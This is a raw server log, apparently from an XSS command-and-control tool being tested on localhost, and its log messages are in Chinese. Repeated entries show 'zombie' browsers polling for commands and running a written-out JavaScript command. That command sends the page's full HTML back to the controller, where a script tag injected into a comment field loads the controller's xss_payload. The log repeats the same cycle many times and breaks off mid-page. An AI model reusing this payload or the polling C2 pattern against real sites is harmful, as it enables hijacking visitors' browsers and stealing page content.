2025-06-26 22:41:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0100s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:41:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:56] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:41:56 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:41:56 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:41:56.146951
2025-06-26 22:41:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0124s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:41:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:56] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:42:01 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:42:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:42:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:42:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:42:01 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:42:01 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:42:01.129Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:42:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0081s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:42:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:01] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:42:01 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:42:01 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:42:01.147270
2025-06-26 22:42:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0122s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:42:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:01] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:42:06 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:42:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:42:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:42:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:42:06 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:42:06 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:42:06.130Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:42:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0054s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:42:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:06] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:42:06 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:42:06 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:42:06.144039
2025-06-26 22:42:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0075s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:42:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:06] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:42:11 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:42:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:42:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:42:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:42:11 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:42:11 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:42:11.129Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:42:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0145s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:42:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:11] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:42:11 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:42:11 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:42:11.158408
2025-06-26 22:42:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0229s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:42:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:11] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:42:16 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:42:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:42:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:42:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:42:16 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:42:16 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:42:16.130Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:42:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0056s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:42:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:16] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:42:16 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:42:16 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:42:16.142682
2025-06-26 22:42:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0070s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:42:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:16] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:42:21 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:42:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:42:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:42:21 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:42:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:42:21 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:42:21 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:42:21.139305
2025-06-26 22:42:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0062s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:42:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:21] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:21 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:42:21.130Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:42:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0077s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:42:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:21] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:42:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:42:26 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:42:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:42:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:42:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:42:26 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:42:26 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:42:26.128Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:42:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0071s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:42:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:26] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:42:26 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:42:26 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:42:26.141428
2025-06-26 22:42:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0089s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:42:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:26] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:42:32 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:42:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:42:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:42:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:42:32 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:42:32 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:42:32.577Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:42:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0087s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:42:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:32] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:42:32 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:42:32 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:42:32.593206
2025-06-26 22:42:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0072s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:42:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:32] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:42:36 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:42:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:42:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:42:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:42:36 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:42:36 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:42:36.128Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:42:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0066s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:42:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:36] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:42:36 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:42:36 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
